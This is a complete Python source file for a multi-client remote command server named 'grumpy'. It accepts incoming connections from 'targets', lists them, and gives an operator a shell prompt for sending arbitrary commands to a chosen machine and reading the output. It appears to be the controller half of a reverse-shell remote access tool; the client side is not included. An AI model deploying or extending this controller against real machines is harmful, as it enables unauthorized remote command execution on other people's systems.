import sys
import time
import socket
import struct
import signal
import threading
from queue import Queue
from config import Config


THREADS = 2
TASKS = [1, 2]
queue = Queue()

COMMANDS = {
    "help": ["Shows this help"],
    "ls clients": ["Lists connected clients"],
    "connect": ["Selects a client by its index. Takes index as a parameter"],
    "quit": [
        "Stops current connection with a client. To be used when client is selected"
    ],
    "exit": ["Shuts server down"],
}


class Server(object):
    def __init__(self):
        self.host = ""
        self.port = Config.PORT
        self.socket = None
        self.connections = []
        self.conn_addresses = []

    def show_help(self):
        for cmd, v in COMMANDS.items():
            print(f"{cmd}:\t{v[0]}")
        return

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_conn)
        signal.signal(signal.SIGTERM, self.quit_conn)
        return

    def quit_conn(self, signal=None, frame=None):
        print("\n......Quitting Connection.......")
        for conn in self.connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print("Could not close connection %s" % str(e))

        self.socket.close()
        sys.exit(0)

    def create_socket(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def bind_socket(self):
        """ Bind socket to port and wait for connection from client """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            print("Socket binding error: " + str(e))
            time.sleep(5)
            self.bind_socket()
        return

    def accept_connections(self):
        """ Accept connections from multiple clients and add to list """
        for c in self.connections:
            c.close()
        self.connections = []
        self.conn_addresses = []
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                address = address + (client_hostname,)
            except Exception as e:
                print("Error accepting connections: %s" % str(e))

                continue
            self.connections.append(conn)
            self.conn_addresses.append(address)
            print(f"\nConnection has been established: {address[-1]} ({address[0]})")
        return

    def run_grumpy(self):
        """  Command shell for sending commands to remote """
        while True:
            cmd = input("grumpy$ ")
            if cmd == "ls clients":
                self.show_connections()
                continue
            elif "connect" in cmd:
                target, conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_commands(target, conn)
            elif cmd == "exit":
                queue.task_done()
                queue.task_done()
                print("Server shutdown")
                break
                # self.quit_conn()
            elif cmd == "help":
                self.show_help()
            elif cmd == "":
                pass
            else:
                print("Command not recognized")
        return

    def show_connections(self):
        """ Show all connections """
        results = ""
        for i, conn in enumerate(self.connections):
            try:
                conn.send(str.encode(" "))
                conn.recv(20480)
            except:
                del self.connections[i]
                del self.conn_addresses[i]
                continue
            results += (
                str(i)
                + "   "
                + str(self.conn_addresses[i][0])
                + "   "
                + str(self.conn_addresses[i][1])
                + "   "
                + str(self.conn_addresses[i][2])
                + "\n"
            )
        print("----- Clients -----" + "\n" + results)
        return

    def get_target(self, cmd):
        """Select target client
        :param cmd:
        """
        target = cmd.split(" ")[-1]
        try:
            target = int(target)
        except:
            print("Client index should be an integer")
            return None, None
        try:
            conn = self.connections[target]
        except IndexError:
            print("Invalid connection")
            return None, None
        print("You are now connected to " + str(self.conn_addresses[target][2]))
        return target, conn

    def read_command_output(self, conn):
        """Read message length and unpack it into an integer
        :param conn:
        """
        raw_msglen = self.recvall(conn, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack(">I", raw_msglen)[0]

        return self.recvall(conn, msglen)

    def recvall(self, conn, n):
        """Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """

        data = b""
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def send_target_commands(self, target, conn):
        """Connect with remote target client
        :param conn:
        :param target:
        """
        conn.send(str.encode(" "))
        cwd_bytes = self.read_command_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        print(cwd, end="")
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = self.read_command_output(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
                if cmd == "quit":
                    break
            except Exception as e:
                print("Connection was lost %s" % str(e))
                break
        del self.connections[target]
        del self.conn_addresses[target]
        return


def create_thread():
    """ Create worker threads (will die when main exits) """
    server = Server()
    server.register_signal_handler()
    for _ in range(THREADS):
        t = threading.Thread(target=task, args=(server,))
        t.daemon = True
        t.start()
    return


def task(server):
    """peform next task in the queue. Thread 1 handels connections and 2 handles sending commands
    :param server:
    """
    while True:
        x = queue.get()
        if x == 1:
            server.create_socket()
            server.bind_socket()
            server.accept_connections()
        if x == 2:
            server.run_grumpy()
        queue.task_done()
    return


def create_task():
    """ Each list item is a new job """
    for x in TASKS:
        queue.put(x)
    queue.join()
    return


def main():
    create_thread()
    create_task()


if __name__ == "__main__":
    main()